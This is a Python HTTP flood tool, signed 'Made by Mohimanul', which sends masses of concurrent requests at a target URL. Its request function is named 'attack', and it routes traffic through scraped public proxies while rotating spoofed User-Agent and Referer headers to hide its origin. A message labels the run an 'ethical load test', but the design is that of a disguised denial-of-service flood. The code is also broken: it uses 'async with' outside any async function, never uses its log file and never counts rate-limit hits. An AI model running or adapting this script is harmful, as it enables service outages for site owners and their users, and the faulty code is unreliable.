import aiohttp
import asyncio
import random
import argparse
import time
import requests
from termcolor import colored, cprint
from aiohttp import ClientTimeout
from collections import defaultdict
import json

# User-Agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

# Function to fetch proxies
def fetch_proxies():
    url = 'https://www.proxy-list.download/api/v1/get?type=http'
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            proxy_list = response.text.strip().split('\r\n')
            return [f"http://{proxy}" for proxy in proxy_list if proxy]
    except Exception as e:
        print(colored(f"Failed to fetch proxies: {e}", "red"))
    return []

# Advanced Proxy Health Check
async def check_proxy_health(session, proxy):
    try:
        async with session.get('http://httpbin.org/ip', proxy=proxy, timeout=10) as response:
            if response.status == 200:
                return proxy
    except:
        return None
    return None

# Function to check multiple proxies concurrently
async def check_all_proxies(session, proxies):
    tasks = [check_proxy_health(session, proxy) for proxy in proxies]
    healthy_proxies = await asyncio.gather(*tasks)
    return [proxy for proxy in healthy_proxies if proxy is not None]

# Request statistics
request_stats = defaultdict(int)

# Semaphore for concurrent requests
sem = asyncio.Semaphore(1000)  # Max concurrent requests

# Function to display banner
def display_banner():
    cprint("\n" + "="*50, "cyan")
    cprint("Made by Mohimanul", "green", attrs=["bold"])
    cprint("The Virtual Myst", "yellow", attrs=["bold"])
    cprint("="*50 + "\n", "cyan")

# Function to apply rate limiting with exponential backoff
async def apply_rate_limit(session, response, backoff_multiplier):
    """
    This function handles rate limiting. If the server responds with a `429 Too Many Requests` status,
    it will apply exponential backoff before retrying the request.
    """
    if response.status == 429:
        # Check if the server provides a 'Retry-After' header, otherwise use a default backoff time
        retry_after = response.headers.get('Retry-After')
        if retry_after:
            wait_time = int(retry_after)
        else:
            # Exponential backoff: Double the wait time after each retry.
            wait_time = random.uniform(2, 5) * backoff_multiplier
        
        print(colored(f"Rate limit hit. Retrying after {wait_time:.2f} seconds...", "yellow"))
        await asyncio.sleep(wait_time)
        return True, backoff_multiplier * 2  # Exponentially increase backoff
    return False, backoff_multiplier  # No rate limit or we don't need to back off

# Attack function with retry limits and improved logging
async def attack(session, url, log_file=None, request_type="GET", payload=None, retries=3):
    global request_stats
    
    backoff_multiplier = 1  # Initial backoff multiplier for exponential backoff

    async with sem:
        attempt = 0
        while attempt < retries:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": random.choice(["text/html", "application/json", "*/*"]),
                "Connection": "keep-alive",
                "Referer": random.choice(["https://google.com", "https://bing.com", ""]),
            }
            
            # Select proxy and check health
            proxy = random.choice(proxies)
            if proxy:
                proxy_health = await check_proxy_health(session, proxy)
                if not proxy_health:
                    continue  # Skip proxy if it's not healthy

            start_time = time.time()  # Start time for calculating response time
            try:
                timeout = ClientTimeout(total=10)

                if request_type == "GET":
                    async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as response:
                        rate_limit_hit, backoff_multiplier = await apply_rate_limit(session, response, backoff_multiplier)
                        if rate_limit_hit:
                            continue  # Retry the request if rate-limited

                        response_time = time.time() - start_time
                        request_stats['total_requests'] += 1
                        request_stats['successful_requests'] += 1
                        request_stats['total_response_time'] += response_time
                        print(colored(f"[+] Sent: {response.status} via {proxy or 'direct'} | Time: {response_time:.2f}s", "green"))
                elif request_type == "POST":
                    async with session.post(url, headers=headers, data=payload, proxy=proxy, timeout=timeout) as response:
                        rate_limit_hit, backoff_multiplier = await apply_rate_limit(session, response, backoff_multiplier)
                        if rate_limit_hit:
                            continue  # Retry the request if rate-limited

                        response_time = time.time() - start_time
                        request_stats['total_requests'] += 1
                        request_stats['successful_requests'] += 1
                        request_stats['total_response_time'] += response_time
                        print(colored(f"[+] POST Sent: {response.status} via {proxy or 'direct'} | Time: {response_time:.2f}s", "green"))

            except Exception as e:
                response_time = time.time() - start_time
                request_stats['total_requests'] += 1
                request_stats['failed_requests'] += 1
                print(colored(f"[-] Error: {e} | Time: {response_time:.2f}s", "red"))
            
            # Log selectively every 100 requests
            if request_stats['total_requests'] % 100 == 0:
                print(colored(f"Request stats: Total: {request_stats['total_requests']} | Success: {request_stats['successful_requests']} | Failures: {request_stats['failed_requests']}", "yellow"))
            
            attempt += 1
            await asyncio.sleep(random.uniform(0.1, 0.5))  # Random delay between requests

# Main function to run tasks
async def main(url, workers, log_file, request_type, payload):
    async with aiohttp.ClientSession() as session:
        tasks = [attack(session, url, log_file, request_type, payload) for _ in range(workers)]
        await asyncio.gather(*tasks)

# Main entry point
if __name__ == "__main__":
    display_banner()

    # Interactive user input
    url = input("Enter the target URL (e.g., http://localhost): ")
    if not url.startswith("http"):
        url = "http://" + url
    port = input("Enter the port (default is 80): ") or "80"
    workers = input("Enter the number of concurrent workers (default is 100): ") or "100"
    request_type = input("Enter the request type (GET/POST, default is GET): ").upper() or "GET"
    log_file = input("Enter the log file name (optional, press Enter to skip): ")
    payload = None

    # If POST request, prompt for data
    if request_type == "POST":
        payload = input("Enter the POST payload (key=value, separate multiple with '&'): ")

    full_url = f"{url}:{port}"
    workers = int(workers)
    log_file = log_file.strip() if log_file else None

    # Fetch proxies
    proxies = fetch_proxies()
    if not proxies:
        proxies = [None]  # Fallback to direct connection

    # Start the load test
    print(colored("Starting advanced ethical load test with rate limiting and exponential backoff...", "cyan"))
    
    # Check proxy health before proceeding
    async with aiohttp.ClientSession() as session:
        proxies = await check_all_proxies(session, proxies)

    asyncio.run(main(full_url, workers, log_file, request_type, payload))

    # Display summary
    print(colored(f"\nTest completed. Total Requests: {request_stats['total_requests']}", "cyan"))
    print(colored(f"Successful Requests: {request_stats['successful_requests']}", "green"))
    print(colored(f"Failed Requests: {request_stats['failed_requests']}", "red"))
    print(colored(f"Rate Limit Hits: {request_stats['rate_limit_hits']}", "yellow"))
    if request_stats['total_requests'] > 0:
        avg_response_time = request_stats['total_response_time'] / request_stats['total_requests']
        print(colored(f"Average Response Time: {avg_response_time:.2f}s", "yellow"))
